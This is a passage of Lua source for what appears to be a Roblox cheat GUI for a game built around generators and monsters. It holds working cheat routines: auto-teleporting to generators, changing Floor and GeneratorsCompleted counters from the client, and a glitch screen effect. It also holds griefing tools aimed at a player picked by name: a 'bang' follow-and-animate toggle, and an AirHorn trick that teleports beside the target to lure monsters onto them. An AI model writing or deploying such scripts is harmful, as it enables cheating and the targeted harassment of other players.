						monitorChasing(monster)  -- Monitorear el estado de "Chasing"
					end
				end
			end

			-- Ciclo principal para los generadores
			while true do
				if not GettingChased then  -- Solo realizar el trabajo con los generadores si no está siendo perseguido
					local bestGenerator = findBestGenerator()
					if bestGenerator then
						local success = teleportToGenerator(bestGenerator)
						if success then
							local generatorCompleted = monitorGenerator(bestGenerator)
							if generatorCompleted then
								warn("Generator completed, searching for new generator")
							end
						else
							warn("Failed to teleport to generator, retrying...")
						end
					else
						warn("No generator found, retrying...")
					end
				end
				wait(0.5)  -- Repetir cada 0.5 segundos
			end
		end

		-- Iniciar el ciclo principal
		mainLoop()
	end)
end;
task.spawn(C_e1);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_e4()
	local script = G2L["e4"];
	-- Reference to the TextLabel
	local textLabel = script.Parent
	local originalText = textLabel.Text
	-- Settings
	local updateInterval = 1 -- Time between each color update

	-- Function to generate a random hex color
	local function getRandomHexColor()
		local r = math.random(0, 255)
		local g = math.random(0, 255)
		local b = math.random(0, 255)
		return string.format("#%02X%02X%02X", r, g, b) -- Convert RGB to hex
	end

	-- Function to apply random colors to each letter
	local function updateTextColors()
		local newText = ""

		-- Iterate through each character and wrap it with a random color
		for i = 1, #originalText do
			local char = originalText:sub(i, i)
			local randomColor = getRandomHexColor()
			newText = newText .. string.format('<font color="%s">%s</font>', randomColor, char)
		end

		textLabel.Text = newText
	end

	-- Main loop to update the text colors
	while true do
		updateTextColors()
		task.wait(updateInterval)
	end

end;
task.spawn(C_e4);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_e5()
	local script = G2L["e5"];
	local function makesoundit(sounid, dur)
		local NewSound = Instance.new("Sound")
		NewSound.SoundId = sounid
		NewSound.Parent = game.Workspace
		NewSound.Volume = 1
		NewSound:Play()
		wait(dur)
		NewSound:Destroy()
	end
	local function SetColorCorrectionBlackScreen(dur)
		local ColorCorrection = Instance.new("ColorCorrectionEffect")
		ColorCorrection.Parent = game.Lighting
		ColorCorrection.Brightness = -1
		ColorCorrection.Contrast = 0
		ColorCorrection.TintColor = Color3.fromRGB(0, 0, 0)
		wait(dur)
		ColorCorrection:Destroy()
	end
	local TweenService = game:GetService("TweenService")

	local function addColorCorrectionThatTweensIntoRedAndWhiteForever()
		task.spawn(function()
			-- Crear y configurar el ColorCorrectionEffect
			local ColorCorrection = Instance.new("ColorCorrectionEffect")
			ColorCorrection.Parent = game.Lighting
			ColorCorrection.Brightness = 0
			ColorCorrection.Contrast = 0
			ColorCorrection.TintColor = Color3.fromRGB(255, 255, 255) -- Blanco inicial

			-- Configurar propiedades del Tween
			local tweenInfo = TweenInfo.new(
				3, -- Duración del Tween
				Enum.EasingStyle.Sine, -- Estilo de la transición
				Enum.EasingDirection.InOut, -- Dirección de la transición
				-1, -- Número de repeticiones (-1 significa infinito)
				true -- Revertir el Tween automáticamente
			)

			-- Alternar entre rojo y blanco
			local tweenGoal = { TintColor = Color3.fromRGB(255, 0, 0) } -- Color rojo

			-- Crear y reproducir el Tween
			local tween = TweenService:Create(ColorCorrection, tweenInfo, tweenGoal)
			tween:Play()
		end)
	end
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Parent.Enabled=false
		wait(4)
		task.spawn(function()
			makesoundit("rbxassetid://372770465", 2)
		end)
		task.spawn(function()
			SetColorCorrectionBlackScreen(2)
		end)
		task.spawn(function()
			-- Gui to Lua
			-- Version: 3.2

			-- Instances:

			local ScreenGui = Instance.new("ScreenGui")
			local staticframe = Instance.new("ImageLabel")

			--Properties:

			ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
			ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			staticframe.Name = "staticframe"
			staticframe.Parent = ScreenGui
			staticframe.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
			staticframe.BackgroundTransparency = 0.800
			staticframe.BorderColor3 = Color3.fromRGB(17, 17, 17)
			staticframe.Position = UDim2.new(0, 0, -0.100000001, 0)
			staticframe.Size = UDim2.new(1, 0, 1.20000005, 0)
			staticframe.ZIndex = 10
			staticframe.Image = "http://www.roblox.com/asset/?id=4388380012"

			-- Scripts:

			local function SKDTQWT_fake_script() -- staticframe.static script 
				local script = Instance.new('Script', staticframe)

				while true do
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388380516"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388381112"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388381606"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388382104"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388382493"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388382958"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388383410"
					wait(0.065)
					script.Parent.Image = "http://www.roblox.com/asset/?id=4388383891"
				end

			end
			coroutine.wrap(SKDTQWT_fake_script)()

			wait(2)
			staticframe.ImageTransparency = 0.8
		end)
		wait(2)
		addColorCorrectionThatTweensIntoRedAndWhiteForever()
		task.spawn(function()
			makesoundit("rbxassetid://5159141859", 45.916)
		end)
		-- Gui to Lua ff6568
		-- Version: 3.2

		-- Instances:

		local ScreenGui = Instance.new("ScreenGui")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")
		local ImageLabel_3 = Instance.new("ImageLabel")
		local ImageLabel_4 = Instance.new("ImageLabel")
		local ImageLabel_5 = Instance.new("ImageLabel")
		local ImageLabel_6 = Instance.new("ImageLabel")
		local ImageLabel_7 = Instance.new("ImageLabel")
		local ImageLabel_8 = Instance.new("ImageLabel")

		--Properties:

		ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

		ImageLabel.Parent = ScreenGui
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 0.999
		ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.BorderSizePixel = 0
		ImageLabel.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_2.Parent = ScreenGui
		ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_2.BackgroundTransparency = 0.999
		ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_2.BorderSizePixel = 0
		ImageLabel_2.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_2.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_2.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_3.Parent = ScreenGui
		ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_3.BackgroundTransparency = 0.999
		ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_3.BorderSizePixel = 0
		ImageLabel_3.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_3.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_3.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_4.Parent = ScreenGui
		ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_4.BackgroundTransparency = 0.999
		ImageLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_4.BorderSizePixel = 0
		ImageLabel_4.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_4.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_4.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_5.Parent = ScreenGui
		ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_5.BackgroundTransparency = 0.999
		ImageLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_5.BorderSizePixel = 0
		ImageLabel_5.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_5.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_5.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_6.Parent = ScreenGui
		ImageLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_6.BackgroundTransparency = 0.999
		ImageLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_6.BorderSizePixel = 0
		ImageLabel_6.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_6.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_6.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_7.Parent = ScreenGui
		ImageLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_7.BackgroundTransparency = 0.999
		ImageLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_7.BorderSizePixel = 0
		ImageLabel_7.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_7.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_7.Image = "http://www.roblox.com/asset/?id=14814473817"

		ImageLabel_8.Parent = ScreenGui
		ImageLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel_8.BackgroundTransparency = 0.999
		ImageLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_8.BorderSizePixel = 0
		ImageLabel_8.Position = UDim2.new(0.134631664, 0, 0.397916675, 0)
		ImageLabel_8.Size = UDim2.new(0, 74, 0, 68)
		ImageLabel_8.Image = "http://www.roblox.com/asset/?id=14814473817"

		-- Scripts:

		local function WHNH_fake_script() -- ImageLabel.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(WHNH_fake_script)()
		local function GWGRLFM_fake_script() -- ImageLabel_2.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_2)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(GWGRLFM_fake_script)()
		local function WSBAH_fake_script() -- ImageLabel_3.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_3)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(WSBAH_fake_script)()
		local function VFDXXKU_fake_script() -- ImageLabel_4.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_4)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(VFDXXKU_fake_script)()
		local function NYMMRPC_fake_script() -- ImageLabel_5.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_5)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(NYMMRPC_fake_script)()
		local function FTAKUQ_fake_script() -- ImageLabel_6.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_6)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(FTAKUQ_fake_script)()
		local function QDYUC_fake_script() -- ImageLabel_7.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_7)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(QDYUC_fake_script)()
		local function CFOY_fake_script() -- ImageLabel_8.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel_8)

			-- Reference to the ImageLabel
			local imageLabel = script.Parent

			-- Settings
			local teleportInterval = 0.05 -- Time in seconds between each teleport
			local screenGui = imageLabel.Parent

			-- Function to teleport the ImageLabel
			local function teleportRandomly()
				-- Get the size of the screen
				local screenSize = screenGui.AbsoluteSize

				-- Calculate a random position within the screen boundaries
				local randomX = math.random(0, screenSize.X - imageLabel.AbsoluteSize.X)
				local randomY = math.random(0, screenSize.Y - imageLabel.AbsoluteSize.Y)

				-- Apply the new position
				imageLabel.Position = UDim2.new(0, randomX, 0, randomY)
			end

			-- Loop to teleport the ImageLabel at intervals
			while true do
				teleportRandomly()
				task.wait(teleportInterval)
			end

		end
		coroutine.wrap(CFOY_fake_script)()
		local function VMGE_fake_script() -- ScreenGui.LocalScript 
			local script = Instance.new('LocalScript', ScreenGui)

			-- Settings
			local glitchDuration = 969999999999999 -- Duration of the glitch effect in seconds
			local colorChangeSpeed = 0.01 -- How quickly the colors change (in seconds)

			-- Function to apply the glitch effect
			local function glitchEffect()
				local allParts = workspace:GetDescendants() -- Get all objects in the workspace
				local affectedParts = {}

				-- Filter for parts that can be color-changed
				for _, obj in ipairs(allParts) do
					if obj:IsA("BasePart") then
						table.insert(affectedParts, obj)
					end
				end

				-- Start the glitch effect
				local glitchStartTime = tick()
				while tick() - glitchStartTime < glitchDuration do
					-- Change colors rapidly
					for _, part in ipairs(affectedParts) do
						part.Color = Color3.new(math.random(), math.random(), math.random()) -- Random color
					end
					task.wait(colorChangeSpeed) -- Wait for the next cycle
				end

				-- Reset parts to their original color after the glitch
				for _, part in ipairs(affectedParts) do
					if part:IsA("BasePart") then
						part.Color = Color3.new(1, 1, 1) -- Reset to white
					end
				end
			end

			glitchEffect()
		end
		coroutine.wrap(VMGE_fake_script)()
		local function IWZOB_fake_script() -- ScreenGui.LocalScript 
			local script = Instance.new('LocalScript', ScreenGui)

			print("Hello world!")

		end
		coroutine.wrap(IWZOB_fake_script)()

	end)
end;
task.spawn(C_e5);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_e9()
	local script = G2L["e9"];
	script.Parent.MouseButton1Click:Connect(function()
		workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.NameTag.Frame:Remove()
	end)
end;
task.spawn(C_e9);
-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.LocalScript
local function C_ec()
	local script = G2L["ec"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = true
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
	end)
end;
task.spawn(C_ec);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_ef()
	local script = G2L["ef"];
	-- Función para actualizar el valor de Floor
	local function updateFloorValue(increment)
		local info = workspace:FindFirstChild("Info")
		if info and info:FindFirstChild("Floor") then
			local floor = info.Floor
			if floor:IsA("NumberValue") then
				floor.Value += increment
				print("Floor value incremented by " .. increment .. ". New value: " .. floor.Value)
			else
				warn("Info.Floor is not a NumberValue.")
			end
		else
			warn("Info or Floor not found in the workspace.")
		end
	end

	-- Conexión del evento del botón
	script.Parent.MouseButton1Click:Connect(function()
		updateFloorValue(10) -- Incrementar Floor en 10
	end)

end;
task.spawn(C_ef);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_f2()
	local script = G2L["f2"];
	-- Función para actualizar el valor de GeneratorsCompleted
	local function updateGeneratorsCompleted(increment)
		local info = workspace:FindFirstChild("Info")
		if info and info:FindFirstChild("GeneratorsCompleted") then
			local generatorsCompleted = info.GeneratorsCompleted
			if generatorsCompleted:IsA("NumberValue") then
				generatorsCompleted.Value += increment
				print("GeneratorsCompleted incremented by " .. increment .. ". New value: " .. generatorsCompleted.Value)
			else
				warn("Info.GeneratorsCompleted is not a NumberValue.")
			end
		else
			warn("Info or GeneratorsCompleted not found in the workspace.")
		end
	end

	-- Conexión del evento del botón
	script.Parent.MouseButton1Click:Connect(function()
		updateGeneratorsCompleted(1) -- Incrementar GeneratorsCompleted en 1
	end)

end;
task.spawn(C_f2);
-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.LocalScript
local function C_f5()
	local script = G2L["f5"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = true
	end)
end;
task.spawn(C_f5);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
local function C_f9()
	local script = G2L["f9"];
	--rainbowify the text
	local TextLabel  = script.Parent
	local IsRainbowActive =  true
	local RainbowColors = {
		Color3.fromRGB(255, 0, 0), -- Red
		Color3.fromRGB(255, 165, 0), -- Orange
		Color3.fromRGB(255, 255, 0), -- Yellow
		Color3.fromRGB(0, 255, 0), -- Green
		Color3.fromRGB(0, 0, 255), -- Blue
		Color3.fromRGB(144, 0, 255), -- Indigo
	}
	local Index = 1
	--start (WITH TWEEN)
	local function rainbowify()
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
		local tween = game:GetService("TweenService"):Create(TextLabel, tweenInfo, {TextColor3 = RainbowColors[Index]})
		tween:Play()
		tween.Completed:Connect(function()
			Index = Index + 1
			if Index > #RainbowColors then
				Index = 1
			end
			rainbowify()
		end)
	end
	rainbowify()
end;
task.spawn(C_f9);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.LocalScript
local function C_105()
	local script = G2L["105"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainTwo.Visible = true
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.Main.Visible = false
	end)
end;
task.spawn(C_105);
-- StarterGui.DebugVersion.Title.script_content.MainThird.LocalScript
local function C_106()
	local script = G2L["106"];
	local TargetBox = script.Parent.TargetBox
	local Target
	local Buttons = {
		bang = TargetBox.Parent.bang,
		MakeMonstersDistract = TargetBox.Parent.callatt
	}

	local player = game.Players.LocalPlayer
	local function SearchPlayer(String)
		--searchs the player for DisplayName, Name, And UserID
		for _,Player in pairs(game.Players:GetPlayers()) do
			if Player.Name:lower() == String:lower() or Player.DisplayName:lower() == String:lower() or tostring(Player.UserId) == String then
				return Player
			end
		end
	end
	local function sendNotification(title, text, typeofnotif)


		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://478544929"
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local function MakeNotification(Title, Text, OnYesFunction, OnNoFunction)

		-- Play the notification sound
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://478544929"
		sound.Volume = 1
		sound.Parent = game.Workspace
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
		local bindable = Instance.new("BindableFunction")

		function bindable.OnInvoke(response)
			print(response .. " chosen")
			if response:lower() == "yes" then
				if OnYesFunction then
					OnYesFunction()
				end
			elseif response:lower() == "no" then
				if OnNoFunction then
					OnNoFunction()
				end
			end
		end
		-- Create the notification
		game.StarterGui:SetCore("SendNotification", {
			Title = Title,
			Text = Text,
			Duration = 5, -- Notification will last for 5 seconds
			Button1 = "Yes",
			Button2 = "No",
			Callback = bindable
		})
	end


	TargetBox.FocusLost:Connect(function()
		if TargetBox.Text == "" then
			return
		end

		local PlayerToTarget = SearchPlayer(TargetBox.Text)
		if PlayerToTarget then
			Target = PlayerToTarget
			TargetBox.Text = PlayerToTarget.Name
		end
	end)
	local IsBanging = false
	function getTorso(x)
		x = x or game.Players.LocalPlayer.Character
		return x:FindFirstChild("Torso") or x:FindFirstChild("UpperTorso") or x:FindFirstChild("LowerTorso") or x:FindFirstChild("HumanoidRootPart")
	end
	task.spawn(function()

	end)
	local AllowBang = false
	local followSpeed = 50 -- Aumentar la velocidad de seguimiento

	local animationId = "rbxassetid://17561277632"
	local animation = Instance.new("Animation")
	animation.AnimationId = animationId
	local animationTrack

	Buttons.bang.MouseButton1Click:Connect(function()
		AllowBang = not AllowBang
		if SearchPlayer(TargetBox.Text)  and AllowBang then
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local humanoid = character:WaitForChild("Humanoid")
			-- Reproducir la animación
			animationTrack = humanoid:LoadAnimation(animation)
			animationTrack:Play()
		elseif not AllowBang then
			-- Detener la animación
			if animationTrack then
				animationTrack:Stop()
			end
		end
	end)
	local function followTarget()
		if AllowBang == true then
			if  SearchPlayer(TargetBox.Text) and  SearchPlayer(TargetBox.Text).Character then
				local targetRoot =  SearchPlayer(TargetBox.Text).Character:FindFirstChild("HumanoidRootPart")
				if targetRoot then

					-- Calcular la posición detrás del objetivo
					local behindPosition = targetRoot.Position - (targetRoot.CFrame.LookVector * 3)

					-- Girar hacia el objetivo
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, targetRoot.Position)

					-- Moverse hacia la posición detrás del objetivo
					local distance = (behindPosition - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
					if distance > 2 then
						local direction = (behindPosition - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).unit
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = direction * followSpeed
					else
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
					end
				end
			else
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
			end
		end
	end

	-- Actualizar la posición cada frame
	game["Run Service"].Heartbeat:Connect(followTarget)
	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function activateitem()
		print("Doing Fnction To Activate Item.. . .")
		local Iventory = game:GetService("Players").LocalPlayer.Character.Inventory
		local function SearchItemIniNVENTORY(itemname)
			--Search in player iventory (get every children in iventory, if it is a ValueString then it will verify if in his value)
			for i,v in pairs(Iventory:GetChildren()) do
				if v:IsA("StringValue") then
					if v.Value == itemname then
						return v
					end
				end
			end
		end
		local IteMToAcTiVaTe = SearchItemIniNVENTORY("AirHorn")
		if IteMToAcTiVaTe then
			local args = {
				[1] = game:GetService("Players").LocalPlayer.Character,
				[2] = game:GetService("Players").LocalPlayer.Character.Inventory[IteMToAcTiVaTe.Name]
			}

			game:GetService("ReplicatedStorage").Events.ItemEvent:InvokeServer(unpack(args))

		end
	end
	Buttons.MakeMonstersDistract.MouseButton1Click:Connect(function()
		local oldcframe = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()
		local function interactWithPrompt(prompt)
			if prompt.HoldDuration == 0 then
				prompt:InputHoldBegin()
				prompt:InputHoldEnd()
			else
				prompt:InputHoldBegin()
				wait(prompt.HoldDuration)
				prompt:InputHoldEnd()
			end
		end

		-- Function to check for the Research Capsule proximity prompts
		local function checkForAHPrompts()
			local character = player.Character
			if character then
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart then
					-- Search for ProximityPrompts inside the CurrentRoom
					local currentRoomFolder = workspace:FindFirstChild("CurrentRoom")
					if currentRoomFolder then
						for _, model in pairs(currentRoomFolder:GetChildren()) do
							local itemsFolder = model:FindFirstChild("Items")
							if itemsFolder then
								-- Iterate through all items in the folder
								for _, item in pairs(itemsFolder:GetChildren()) do
									-- Check for ResearchCapsule specifically
									if item.Name == "AirHorn" then
										local promptPart = item:FindFirstChild("Prompt")
										if promptPart then
											TP(promptPart)
											wait(0.5)
											local proximityPrompt = promptPart:FindFirstChild("ProximityPrompt")

											interactWithPrompt(proximityPrompt)
										end
									end
								end
							end
						end
					end
				end
			end
		end
		local Iventory = game:GetService("Players").LocalPlayer.Character.Inventory
		local function SearchItemIniNVENTORY(itemname)
			--Search in player iventory (get every children in iventory, if it is a ValueString then it will verify if in his value)
			for i,v in pairs(Iventory:GetChildren()) do
				if v:IsA("StringValue") then
					if v.Value == itemname then
						return v
					end
				end
			end
		end
		local IteMToAcTiVaTe = SearchItemIniNVENTORY("AirHorn")
		if IteMToAcTiVaTe then
			TP(getTorso(Target.Character))

			wait(0.5)
			activateitem()
			wait(1)
			game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(oldcframe)
		else
			checkForAHPrompts()
			wait(2)
			TP(getTorso(Target.Character))

			wait(0.5)
			activateitem()
			wait(1)
			game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(oldcframe)
		end
	end)
end;
task.spawn(C_106);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
local function C_109()
	local script = G2L["109"];
	--rainbowify the text
	local TextLabel  = script.Parent
	local IsRainbowActive =  true
	local RainbowColors = {
		Color3.fromRGB(255, 0, 0), -- Red
		Color3.fromRGB(255, 165, 0), -- Orange
		Color3.fromRGB(255, 255, 0), -- Yellow
		Color3.fromRGB(0, 255, 0), -- Green
		Color3.fromRGB(0, 0, 255), -- Blue
		Color3.fromRGB(144, 0, 255), -- Indigo
	}
	local Index = 1
	--start (WITH TWEEN)
	local function rainbowify()
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
